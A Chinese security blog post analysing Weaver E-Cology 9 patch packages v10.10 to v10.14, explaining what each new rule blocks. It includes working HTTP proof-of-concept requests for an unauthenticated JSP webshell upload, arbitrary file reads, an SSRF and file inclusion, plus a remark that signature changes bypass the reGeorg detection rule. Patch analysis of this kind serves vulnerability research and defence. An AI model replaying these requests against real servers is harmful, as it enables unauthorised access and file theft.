<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>泛微历史漏洞分析【长文多图】(截止10.55补丁包) | Sp4ce's Blog</title><meta name="author" content="Sp4ce"><meta name="copyright" content="Sp4ce"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="概述泛微OA E-Cology 9产品发布于2018-09-28 泛微9此版大版本号为9.00.1902.01内部补丁信息如下  客户端安全包软件版本： v10.03客户端安全包规则库版本： v10.00  补丁分析补丁在2019之前主要为E7、E8产品线，E9的产品线与E8代码高度重叠，这也导致E"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://0x20h.com/p/fe8f.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//static.cloudflareinsights.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-JK5LY6FWX7"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-JK5LY6FWX7');
</script><script defer="defer" data-pjax="data-pjax" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;65d69753a4984768b34ed1ca9826ffd6&quot;}"></script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: {"limitDay":30,"position":"top","messagePrev":"距离该文章上次更新已有","messageNext":"天，部分内容可能已过期."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: true,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '泛微历史漏洞分析【长文多图】(截止10.55补丁包)',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-05-10 19:00:18'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = url => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      link.onload = () => resolve()
      link.onerror = () => reject()
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="referrer" content="no-referrer-when-downgrade" /><link rel="stylesheet" href="/css/custom.css"><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">86</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">41</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">24</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-user"></i><span> 关于我</span></a></div><div class="menus_item"><a class="site-page" href="/contact/"><i class="fa-fw fa fa-address-card"></i><span> 联系方式</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/./img/random/material-15.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Sp4ce's Blog"><span class="site-name">Sp4ce's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-user"></i><span> 关于我</span></a></div><div class="menus_item"><a class="site-page" href="/contact/"><i class="fa-fw fa fa-address-card"></i><span> 联系方式</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">泛微历史漏洞分析【长文多图】(截止10.55补丁包)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-10T10:55:52.000Z" title="发表于 2023-05-10 18:55:52">2023-05-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-10T11:00:18.028Z" title="更新于 2023-05-10 19:00:18">2023-05-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">11.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>59分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="泛微历史漏洞分析【长文多图】(截止10.55补丁包)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>泛微OA E-Cology 9产品发布于2018-09-28</p>
<h1 id="泛微9"><a href="#泛微9" class="headerlink" title="泛微9"></a>泛微9</h1><p>此版大版本号为<code>9.00.1902.01</code>内部补丁信息如下</p>
<blockquote>
<p>客户端安全包软件版本： v10.03<br>客户端安全包规则库版本： v10.00</p>
</blockquote>
<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>补丁在2019之前主要为E7、E8产品线，E9的产品线与E8代码高度重叠，这也导致E8和E9的安全补丁几乎一样，部分代码可以说一模一样。<br>泛微漏洞的修补手法和<code>oracle</code>的如出一辙，为黑名单路径模式，黑名单不了的就把文件置空或者方法置空</p>
<h3 id="Ecology-security-20190213-v10-10补丁包-【v10-03-10-10】"><a href="#Ecology-security-20190213-v10-10补丁包-【v10-03-10-10】" class="headerlink" title="Ecology_security_20190213_v10.10补丁包 【v10.03-10.10】"></a>Ecology_security_20190213_v10.10补丁包 【v10.03-10.10】</h3><p>对比后新增<code>SecurityRuleCtrFreq</code>、<code>SecurityRuleForbiddenFCK</code>、<code>SecurityRuleNeedLoginFormmodel</code>、<code>SecurityRuleSptmThumbnail</code>等多个规则<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215544301.png"></p>
<h4 id="SecurityRuleJspCheck"><a href="#SecurityRuleJspCheck" class="headerlink" title="SecurityRuleJspCheck"></a>SecurityRuleJspCheck</h4><p>规则新增对正向代理<code>reGeorg</code>的检测,修改特征即可绕过<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215544366.png"></p>
<h4 id="SecurityRuleCtrFreq"><a href="#SecurityRuleCtrFreq" class="headerlink" title="SecurityRuleCtrFreq"></a>SecurityRuleCtrFreq</h4><p>此规则为访问速率控制规则<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215544643.png"></p>
<h4 id="SecurityRuleForbiddenFCK"><a href="#SecurityRuleForbiddenFCK" class="headerlink" title="SecurityRuleForbiddenFCK"></a>SecurityRuleForbiddenFCK</h4><p>此规则为<code>SecurityRuleForbiddenFMJ</code>规则的增补版本，新增对<code>FCK</code>编辑器相关路径限制<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215544992.png"><br>具体文件目录为</p>
<blockquote>
<p>D:\WEAVER\ecology\FCKEditor\editor\fckdialog.html<br>D:\WEAVER\ecology\formmode\js\editor\fckdialog.html<br>D:\WEAVER\ecology\FCKEditor\editor\fckdebug.html<br>D:\WEAVER\ecology\formmode\js\editor\fckdebug.html</p>
</blockquote>
<h4 id="SecurityRuleSptmThumbnail"><a href="#SecurityRuleSptmThumbnail" class="headerlink" title="SecurityRuleSptmThumbnail"></a>SecurityRuleSptmThumbnail</h4><p>该规则修复了一个重定向漏洞<del>或可用于水坑攻击？</del><strong>【需登录】</strong><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215545249.png"><br>涉及到的类为<code>weaver.splitepage.transform.SptmForThumbnail</code>，路径在<code>classbean/weaver/splitepage/transform/SptmForThumbnail.class</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /weaver/weaver.splitepage.transform.SptmForThumbnail?filerealpath=page\resource\userfile/image/elementPrew/picture/Hindustry2.png HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: insomnia/2022.2.1</span><br><span class="line">Cookie: ecology_JSessionid=aaaJf7dLW4rqK8zTDfviy</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215545533.png"></p>
<h4 id="SecurityRuleNeedLoginFormmodel"><a href="#SecurityRuleNeedLoginFormmodel" class="headerlink" title="SecurityRuleNeedLoginFormmodel"></a>SecurityRuleNeedLoginFormmodel</h4><p>该规则修复了一个<code>ktree</code>组件的前台任意文件上传漏洞<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215545843.png"><br>涉及到的类为<code>com.weaver.formmodel.apps.ktree.servlet.ktreeuploadaction</code><br>断点构造数据包如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: insomnia/2022.2.1</span><br><span class="line">Content-Type: multipart/form-data; boundary=X-INSOMNIA-BOUNDARY</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 187</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">--X-INSOMNIA-BOUNDARY</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.jsp&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;% out.println(&quot;Hello!&quot;); %&gt;</span><br><span class="line">--X-INSOMNIA-BOUNDARY--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215546089.png"><br>获得回显路经<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215546325.png"><br>访问即可执行<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215547012.png"></p>
<h4 id="前台获取泛微补丁号"><a href="#前台获取泛微补丁号" class="headerlink" title="前台获取泛微补丁号"></a>前台获取泛微补丁号</h4><p>在该版补丁中泛微新增了文件<code>join/getSecurityInfo.jsp</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215547272.png"><br>打完补丁后访问<code>/join/getSecurityInfo.jsp</code>即可获取补丁和系统版本<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215547527.png"></p>
<h3 id="Ecology-security-20190402-v10-11"><a href="#Ecology-security-20190402-v10-11" class="headerlink" title="Ecology_security_20190402_v10.11"></a>Ecology_security_20190402_v10.11</h3><p>上一个版本的E8产品线规则增补，无安全补丁</p>
<h3 id="Ecology-security-20190410-v10-12"><a href="#Ecology-security-20190410-v10-12" class="headerlink" title="Ecology_security_20190410_v10.12"></a>Ecology_security_20190410_v10.12</h3><h4 id="SecurityRule04"><a href="#SecurityRule04" class="headerlink" title="SecurityRule04"></a>SecurityRule04</h4><p>对resin解析后缀追加黑名单<code>.jspa</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215547885.png"></p>
<h4 id="SecurityRuleForbiddenFCK-1"><a href="#SecurityRuleForbiddenFCK-1" class="headerlink" title="SecurityRuleForbiddenFCK"></a>SecurityRuleForbiddenFCK</h4><p>修改代码，新增<code>.htaccess</code>黑名单<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215548193.png"></p>
<h4 id="SecurityRuleJspCheck-1"><a href="#SecurityRuleJspCheck-1" class="headerlink" title="SecurityRuleJspCheck"></a>SecurityRuleJspCheck</h4><p>新增<code>defineClass</code>黑名单关键字<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215548914.png"></p>
<h4 id="SecurityRuleForbiddenJHBServlet"><a href="#SecurityRuleForbiddenJHBServlet" class="headerlink" title="SecurityRuleForbiddenJHBServlet"></a>SecurityRuleForbiddenJHBServlet</h4><p>该规则限制了未授权访问<code>Jabber HTTP Binding Servlet</code>页面以及旗下接口，确认为XXE漏洞<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215549243.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215549497.png"></p>
<h4 id="SecurityRuleLoginidCheck"><a href="#SecurityRuleLoginidCheck" class="headerlink" title="SecurityRuleLoginidCheck"></a>SecurityRuleLoginidCheck</h4><p>规则限制<code>cmd</code>参数为<code>checkValicateCode</code>、<code>verifyQuestion</code>、<code>saveNewPassword</code>访问<code>/js/hrm/getdata.jsp</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215549824.png"><br><del>试了下似乎是任意用户密码修改？</del></p>
<h4 id="SecurityRuleQiyuesuoDownload"><a href="#SecurityRuleQiyuesuoDownload" class="headerlink" title="SecurityRuleQiyuesuoDownload"></a>SecurityRuleQiyuesuoDownload</h4><p>对路径<code>js/wf_qiyuesuodownload.jsp</code>、<code>/ueditor/dialogs/link/link.html</code>进行限制，测试发现<code>wf_qiyuesuodownload.jsp</code>在泛微9不存在<br><code>/ueditor/dialogs/link/link.html</code>是ueditor默认的一个页面</p>
<h3 id="Ecology-security-20190725-v10-14"><a href="#Ecology-security-20190725-v10-14" class="headerlink" title="Ecology_security_20190725_v10.14"></a>Ecology_security_20190725_v10.14</h3><h4 id="SecurityRule15ActionJsp"><a href="#SecurityRule15ActionJsp" class="headerlink" title="SecurityRule15ActionJsp"></a>SecurityRule15ActionJsp</h4><p>新增多个黑名单后缀<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215550180.png"><br>检测URI是否为<code>/weaver/</code>路径直接访问类的形式<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215550504.png"></p>
<h4 id="SecurityRule24FormActionJsp"><a href="#SecurityRule24FormActionJsp" class="headerlink" title="SecurityRule24FormActionJsp"></a>SecurityRule24FormActionJsp</h4><p>对路径<code>/mobilemode/formcomponentaction.jsp</code>进行限制<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215550752.png"><br>是一个任意文件上传，<code>getshell</code>需要配合解压操作<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215551005.png"></p>
<h4 id="SecurityRuleFileDownload21"><a href="#SecurityRuleFileDownload21" class="headerlink" title="SecurityRuleFileDownload21"></a>SecurityRuleFileDownload21</h4><p>任意文件下载漏洞，<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215551288.png"><br>涉及到的文件<code>ljstln/ln/FileDownload.java</code>，<br>漏洞代码<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215551560.png"><br>访问路径<code>/weaver/ln.filedownload</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /weaver/ln.FileDownload?fpath=C:\Windows\System32\drivers\etc\hosts HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=utf-8</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://10.10.10.38/wui/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215551806.png"></p>
<h4 id="SecurityRuleFileDownload22"><a href="#SecurityRuleFileDownload22" class="headerlink" title="SecurityRuleFileDownload22"></a>SecurityRuleFileDownload22</h4><p>任意文件下载漏洞，<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215552110.png"><br>涉及到的文件<code>weaver/file/FileDownload.java</code><br>漏洞代码<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215552415.png"><br>限制了请求类型为<code>GET</code> 因此只能SSRF</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /weaver/weaver.file.FileDownload/.css?type=netimag&amp;urlstr=http://127.0.0.1 HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://10.10.10.38/wui/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="SecurityRuleForbiddenFCK-2"><a href="#SecurityRuleForbiddenFCK-2" class="headerlink" title="SecurityRuleForbiddenFCK"></a>SecurityRuleForbiddenFCK</h4><p>新增限制访问<code>fckdialog.html</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215552680.png"></p>
<h4 id="SecurityRuleForbiddenJHBServlet-1"><a href="#SecurityRuleForbiddenJHBServlet-1" class="headerlink" title="SecurityRuleForbiddenJHBServlet"></a>SecurityRuleForbiddenJHBServlet</h4><p>新增限制访问<code>log4j.properties</code>、<code>/j_security_check</code>、<code>.license</code>路径<br>其中路径<code>j_security_check</code>为resin内部定义<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215552948.png"><br>跟进后发现为运维平台所用，端口9081</p>
<h4 id="SecurityRuleImgTextViewFor23"><a href="#SecurityRuleImgTextViewFor23" class="headerlink" title="SecurityRuleImgTextViewFor23"></a>SecurityRuleImgTextViewFor23</h4><p>限制对路径<code>/social/im/ImgTextView.jsp</code>访问<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215553197.png"><br>跟进后发现为文件包含漏洞，限制路径在<code>ecology</code>目录下<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215553469.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /social/im/ImgTextView.jsp HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://10.10.10.38/wui/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: ecology_JSessionid=aaaZv8JsPLUYj5KcMzGky; JSESSIONID=aaaZv8JsPLUYj5KcMzGky; ecology_JSessionId=aaaZv8JsPLUYj5KcMzGky; __randcode__=aaaZv8JsPLUYj5KcMzGky; MJSESSIONID=abcGXMXsAvKVVfKakdkly</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 21</span><br><span class="line"></span><br><span class="line">url=/log4j.properties</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215553848.png"></p>
<h4 id="SecurityRuleLoginidCheck-1"><a href="#SecurityRuleLoginidCheck-1" class="headerlink" title="SecurityRuleLoginidCheck"></a>SecurityRuleLoginidCheck</h4><p>相对于<code>10.12</code>增加<code>checkSMSCode</code>、<code>sendEmailCode</code>方法检测<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215554113.png"></p>
